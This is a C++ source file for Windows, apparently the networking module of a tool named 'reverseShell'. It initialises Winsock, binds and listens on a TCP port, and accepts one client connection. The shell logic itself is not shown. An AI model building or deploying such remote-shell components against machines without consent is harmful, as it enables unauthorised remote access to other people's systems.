#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>

#include "reverseShell.h"

extern reverseShell_t	shell;
extern BOOL				g_stopProcess;
extern volatile LONG	g_stopRoutines;

static BYTE getAddr(void) {
	shell.addrHints.ai_flags = AI_PASSIVE;
	shell.addrHints.ai_family = AF_INET;
	shell.addrHints.ai_socktype = SOCK_STREAM;
	shell.addrHints.ai_protocol = IPPROTO_TCP;

	if (getaddrinfo(HOSTNAME, PORT, &shell.addrHints, &shell.addrResult)) {
		journalReport(L"Addrinfo failure\n");
		return (FAILURE);
	} else {
		journalReport(L"Addrinfo success\n");
	}
	return (SUCCESS);
}

static BYTE initWinSockDll(void) {
	WSADATA wsaData = {};

	if (WSAStartup(MAKEWORD(2,2), &wsaData))
		return (FAILURE);
	return (SUCCESS);
}

static BYTE createSocket(void) {
	if (getAddr() == FAILURE)
		return (FAILURE);
	
	shell.listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (shell.listenSocket == INVALID_SOCKET)
		return (FAILURE);
	return (SUCCESS);
}

static BYTE bindSocket(void) {
	if (bind(
			shell.listenSocket,
			shell.addrResult->ai_addr,
			(int)shell.addrResult->ai_addrlen
			) == SOCKET_ERROR
		) {
			//journalReport(L"Failed to bind socket\n");
			return (FAILURE);
		}
	return (SUCCESS);
}

static BYTE listenSocket(void) {
	if (listen(shell.listenSocket, 1)) {
		//journalReport(L"Failed to listen\n");
		return (FAILURE);
	}
	//journalReport(L"Listenning to socket\n");
	return (SUCCESS);
}

static BYTE acceptClient(void) {
	if (processShouldStop() == TRUE)
		return (FAILURE);
	shell.clientSocket = accept(shell.listenSocket, NULL, NULL);
	journalReport(L"Accepted client\n");

	if (shell.clientSocket == INVALID_SOCKET) {
		journalReport(L"Invalid client socket \n");
		return (FAILURE);
	}
	return (SUCCESS);
}

BYTE initNetworking(void) {
	if (initWinSockDll() == FAILURE) return (FAILURE);

	if (createSocket() == FAILURE) return (FAILURE);

	if (bindSocket() == FAILURE) return (FAILURE);

	if (listenSocket() == FAILURE) return (FAILURE);

	if (acceptClient() == FAILURE) return (FAILURE);

	return (SUCCESS);
}